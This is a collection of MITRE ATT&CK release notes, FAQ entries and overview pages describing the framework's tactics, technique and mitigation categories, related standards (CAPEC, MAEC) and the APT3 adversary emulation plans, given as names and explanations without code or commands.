The biggest changes are the deprecation of the PRE-ATT&CK domain, the addition of two new Tactics to replace PRE-ATT&CK, and the addition of the Network platform to Enterprise ATT&CK. This version of ATT&CK for Enterprise contains 14 Tactics, 177 Techniques, and 348 Sub-techniques. Retirement of PRE-ATT&CK This release deprecates and removes the PRE-ATT&CK domain from ATT&CK, replacing its scope with two new Tactics in Enterprise ATT&CK Reconnaissance and Resource Development. A new platform has also been added to ATT&CK to represent the environment these techniques occur in, PRE. The previous contents of PRE-ATT&CK have been preserved here. See the accompanying blog post for more details. New techniques in Reconnaissance: Active Scanning Scanning IP Blocks Vulnerability Scanning Gather Victim Host Information Client Configurations Firmware Hardware Software Gather Victim Identity Information Credentials Email Addresses Employee Names Gather Victim Network Information DNS Domain Properties IP Addresses Network Security Appliances Network Topology Network Trust Dependencies Gather Victim Org Information Business Relationships Determine Physical Locations Identify Business Tempo Identify Roles Phishing for Information Spearphishing Attachment Spearphishing Link Spearphishing Service Search Closed Sources Purchase Technical Data Threat Intel Vendors Search Open Technical Databases CDNs DNS/Passive DNS Digital Certificates Scan Databases WHOIS Search Open Websites/Domains Search Engines Social Media Search Victim-Owned Websites New techniques in Resource Development: Acquire Infrastructure Botnet DNS Server Domains Server Virtual Private Server Web Services Compromise Accounts Email Accounts Social Media Accounts Compromise Infrastructure Botnet DNS Server Domains Server Virtual Private Server Web Services Develop Capabilities Code Signing Certificates Digital Certificates Exploits Malware Establish Accounts Email Accounts Social Media Accounts Obtain Capabilities Code Signing Certificates Digital Certificates Exploits Malware Tool Vulnerabilities ATT&CK for Network Infrastructure Devices 13 techniques and 15 sub-techniques have been added or modified to cover adversary behavior against network infrastructure devices that constitute the fabric of enterprises' networks such as switches and routers. These techniques are represented by a new platform in ATT&CK for Enterprise, Network. New and updated techniques for Network: Exploit Public-Facing Application Command and Scripting Interpreter Network Device CLI Pre-OS Boot ROMMONkit TFTP Boot Traffic Signaling Port Knocking Modify Authentication Process Network Device Authentication Modify System Image Downgrade System Image Patch System Image Network Boundary Bridging Network Address Translation Traversal Weaken Encryption Disable Crypto Hardware Reduce Key Space Data from Configuration Repository Network Device Configuration Dump SNMP (MIB Dump) Input Capture Keylogging Non-Application Layer Protocol Proxy Multi-hop Proxy Automated Exfiltration Traffic Duplication Many of the new Network techniques and sub-techniques focus on embedded network devices running closed source proprietary operating systems. This is largely driven by behaviors present in reported in the wild intrusions. Many newer devices leverage commodity embedded operating systems such as Linux or BSD variants, but accounts of adversary activity against these have been more sparse. However, network infrastructure devices running proprietary operating systems are still widely deployed on the Internet and within enterprises. We will continue to build out additional Network techniques and sub-techniques as they become known. We welcome contributions and feedback from the community and look to improve this representation of behaviors in the network infrastructure devices space. Techniques Enterprise We also added 1 additional new technique and 7 sub-techniques to Enterprise in this ATT&CK release beyond the scope of the above updates: Boot or Logon Autostart Execution: Print Processors Cloud Infrastructure Discovery Hide Artifacts: VBA Stomping Impair Defenses: Disable Cloud Logs Man-in-the-Middle: ARP Cache Poisoning Scheduled Task/Job: Systemd Timers Signed Binary Proxy Execution: Verclsid Steal or Forge Kerberos Tickets: AS-REP Roasting All Enterprise technique changes are documented below.

The biggest change is the addition of a new set of Data Source and Data Component objects in Enterprise ATT&CK, complementing the ATT&CK Data Source name changes released in ATT&CK v9. An accompanying blog post describes these changes as well as improvements across ATT&CK's various domains and platforms. In this release we have renamed T1185 and T1557 to be more inclusive, and deprecated T1053.004 to better reflect adversary behavior. This version of ATT&CK for Enterprise contains 14 Tactics, 188 Techniques, 379 Sub-techniques, 129 Groups, and 637 Pieces of Software.

It does not contain updates to techniques- a larger technique update is planned for later this year. We're happy to check off another box on our planned changes this year, which was to modify how we represent mitigations in Enterprise so that the information is organized similar to how mitigations are handled in ATT&CK for Mobile. Mitigations in Enterprise are now treated like categories and are represented by objects similar to Groups and Software- one example being \"Multi-factor Authentication\". In the previous free-text mitigation fields, several techniques may reference multi-factor authentication as a potential way to mitigate a technique, but it was difficult to see which techniques a particular mitigation applies to without scouring the text fields across the techniques. Now each technique that a mitigation applies to will be associated to that mitigation category and the details of how each mitigation applies to a technique will appear in a table under the mitigations section. Each mitigation category has a page that lists all the techniques associated with it to give an at-a-glance view of coverage. In all, 40 new mitigation categories were created based on a text analysis of each technique where we pulled apart the definitions and binned them into like categories to consolidate the mitigation information in Enterprise. During the process of applying the new mitigation categories, we also did a bit of house cleaning on what mitigations are appropriate for certain techniques. We generally took the stance that if a mitigation does not directly apply to that specific behavior, then we removed it. For example, there were quite a few techniques that we removed application whitelisting (Execution Prevention) from because it was previously treated as a mitigation of last resort. Mitigations are represented as courses of action in STIX and will have the same ID numbering as Mobile mitigations (M####). The old mitigation text for techniques were placed into temporary mitigations objects with the full text field and will be included as deprecated mitigation objects. They are listed in STIX objects for historical purposes, but will not be present in the website. Those mitigation objects are labeled with the same technique ID (T####) as the technique they were associated to. The Effects tactic in ATT&CK for Mobile was renamed to Impact for consistency with the Enterprise Impact tactic. We've also updated the Enterprise tactic descriptions based on a contribution from Elly Searle at CrowdStrike to make them more straightforward, uniform, and easier to understand.

Related Standardization Efforts CAPEC Common Attack Pattern Enumeration and Classification (CAPEC\u2122) is an effort to provide a publicly available catalog of common attack patterns classified in an intuitive manner, along with a comprehensive schema for describing related attacks and sharing information about those attacks. Understanding adversary behavior is increasingly important in cybersecurity. Two approaches exist for organizing knowledge about adversary behavior \u2013 CAPEC and ATT&CK, each focused on a specific set of use-cases. Please visit the CAPEC and ATT&CK Comparison page that explains the similarities, differences, and relationship between CAPEC and ATT&CK and the role of each in cybersecurity. The ATT&CK and CAPEC efforts are collaborating to map related details between ATT&CK techniques and CAPEC attack patterns. CAPEC has incorporated an initial mapping of ATT&CK techniques in version 2.8 and related ATT&CK techniques have CAPEC ID references. MAEC Malware Attribute Enumeration and Characterization (MAEC\u2122) is a collaborative community-driven effort to define and develop a standardized language for sharing structured information about malware based upon attributes such as behaviors, artifacts, and attack patterns. The characterization of malware using abstract patterns offers a wide range of benefits over the usage of physical signatures. It allows for the accurate encoding of how malware operates and the specific actions that it performs. Such information can not only be used for malware detection but also for assessing the end-goal the malware is pursuing and the corresponding threat that it represents. Focusing on the attributes and behaviors of malware facilitates detection and analysis of emerging, sophisticated malware threats that circumvent the traditional signature-based and heuristic approaches. Characterizing malware in a standard way supports collaboration across organizations and the identification of common behavior, functionality, and code bases across instances of malware. There exists alignment and overlap between some of the post-access techniques covered by ATT&CK and the capability and behavior abstractions that are part of MAEC\u2019s standardized characterization of malware behavior. While ATT&CK takes a general approach, remaining agnostic to specific tools adversaries may use, there is still value in relating back to standardized methods of describing certain attributes of malware wherever applicable.

These are prototype documents of what can be done with publicly available threat reports and ATT&CK. The purpose of this activity is to allow defenders to more effectively test their networks and defenses by enabling red teams to more actively model adversary behavior, as described by ATT&CK. This is part of a larger process to help more effectively test products and environments, as well as create analytics for ATT&CK behaviors rather than detecting a specific indicator of compromise (IOC) or specific tool. There are many threat intel reports that focus on malware reverse engineering, initial compromise, and command and control (C2) explanations; however, there are not many threat reports on how attackers are chaining techniques together or how attackers operate on keyboard. Because these prototypes are built on these open threat reports, they have the same limitations. To help with this, we provided a sample way to string the ATT&CK tactics together based on general red teaming experience. To create these plans, the team drilled down on specific APT groups listed in ATT&CK and see what kind of plans could be generated for an operator to emulate those APTs. After reading what capabilities were provided by an APT's tools, we compiled a list of other ways to exhibit the same behavior. We wanted operators to behave generally like a specific adversary (sticking to that adversary's known TTPs and behaviors), but having some latitude in actual implementation. To help with this, we also provided a cheat sheet for commands that can be executed for similar behavior in some of the most commonly used red teaming tools. An example, high-level diagram below highlights one possible way to structure an APT3 emulation plan. We will not be going through this for every group on ATT&CK, rather select a subset we feel offer a unique perspective for defenses to be measured. We hope that the community finds use in these prototypes, and builds on them to make ATT&CK actionable. These are living documents that can be updated with newer information, format, or changed for other uses. Please reach out to attack@mitre.org for anything relating to these prototypes. Emulation Plan Documents APT3 The MITRE APT3 Adversary Emulation Plans outline the behavior of persistent threat groups mapped to ATT&CK. They are used by adversary emulation teams to test an organizations network security and security products against specific threats. APT3 Adversary Emulation Plan The Adversary Emulation Field Manual is a companion document to the Adversary Emulation Plan for a particular adversary group. It breaks out command-by-command actions that the group is known to use or example commands to exhibit the same behavior as their tools, mapped to ATT&CK and related commands from public and commercially available offensive testing frameworks.

Why did MITRE develop ATT&CK? What are \"tactics\"? What are \"techniques\"? What are \"sub-techniques\"? What are \"procedures\"? What are the differences between sub-techniques and procedures? What technologies does ATT&CK apply to? How can I use ATT&CK? What is ATT&CK? ATT&CK is a knowledge base of cyber adversary behavior and taxonomy for adversarial actions across their lifecycle. ATT&CK has two parts: ATT&CK for Enterprise, which covers behavior against enterprise IT networks and cloud, and ATT&CK for Mobile, which focuses on behavior against mobile devices. Why did MITRE develop ATT&CK? MITRE started ATT&CK in 2013 to document common tactics, techniques, and procedures (TTPs) that advanced persistent threats use against Windows enterprise networks. It was created out of a need to document adversary behaviors for use within a MITRE research project called FMX. The objective of FMX was to investigate use of endpoint telemetry data and analytics to improve post-compromise detection of adversaries operating within enterprise networks. ATT&CK was used as the basis for testing the efficacy of the sensors and analytics under FMX and served as the common language both offense and defense could use to improve over time. What are \"tactics\"? Tactics represent the \u201cwhy\u201d of an ATT&CK technique or sub-technique. It is the adversary\u2019s tactical goal: the reason for performing an action. For example, an adversary may want to achieve credential access. What are \"techniques\"? Techniques represent \u201chow\u201d an adversary achieves a tactical goal by performing an action. For example, an adversary may dump credentials to achieve credential access. What are \"sub-techniques\"? Sub-techniques are a more specific description of the adversarial behavior used to achieve a goal. They describe behavior at a lower level than a technique. For example, an adversary may dump credentials by accessing the Local Security Authority (LSA) Secrets. What are \"procedures\"? Procedures are the specific implementation the adversary uses for techniques or sub-techniques. For example, a procedure could be an adversary using PowerShell to inject into lsass.exe to dump credentials by scraping LSASS memory on a victim. Procedures are categorized in ATT&CK as the observed in the wild use of techniques in the \"Procedure Examples\" section of technique pages. What are the differences between sub-techniques and procedures? Sub-techniques and procedures describe different things in ATT&CK. Sub-techniques are used to categorize behavior and procedures are used to describe in-the-wild use of techniques. Furthermore, since procedures are specific implementations of techniques and sub-techniques, they may include several additional behaviors in how they are performed. For example, an adversary using PowerShell to inject into lsass.exe to dump credentials by scraping LSASS memory on a victim is a procedure implementation containing several (sub)techniques covering the PowerShell, Process Injection, and Credential Dumping against LSASS behaviors. What technologies does ATT&CK apply to? Enterprise IT systems covering Windows, macOS, Linux, Network infrastructure devices (Network), and Container technologies (Containers); cloud systems covering Infrastructure-as-a-Service (IaaS), Software-as-a-Service (SaaS), Office 365, Azure Active Directory (Azure AD), and Google Workspace; mobile devices covering Android and iOS. How can I use ATT&CK? ATT&CK can be used in several ways to help security operations, threat intelligence, and security architecture.

What is the relationship between ATT&CK and the Diamond Model? What is the relationship between ATT&CK and the Lockheed Martin Cyber Kill Chain\u00ae? How does ATT&CK relate to other cyber frameworks and models? Each model and framework can be used for different purposes. We have documented several use cases where ATT&CK can be used to provide granular detail on adversary behavior. We believe most models and frameworks are complementary to ATT&CK, so you don't have to choose just one. What is the relationship between ATT&CK and the Diamond Model? ATT&CK and the Diamond Model are complementary. ATT&CK documents detailed adversary behavior while the Diamond Model is helpful if you're trying to cluster intrusions. There are cases where they may be used together. For example, ATT&CK-mapped techniques may be a useful source of input into the Diamond Model to analyze adversary capabilities. What is the relationship between ATT&CK and the Lockheed Martin Cyber Kill Chain\u00ae? ATT&CK and the Cyber Kill Chain are complementary. ATT&CK sits at a lower level of definition to describe adversary behavior than the Cyber Kill Chain. ATT&CK Tactics are unordered and may not all occur in a single intrusion because adversary tactical goals change throughout an operation, whereas the Cyber Kill Chain uses ordered phases to describe high level adversary objectives.
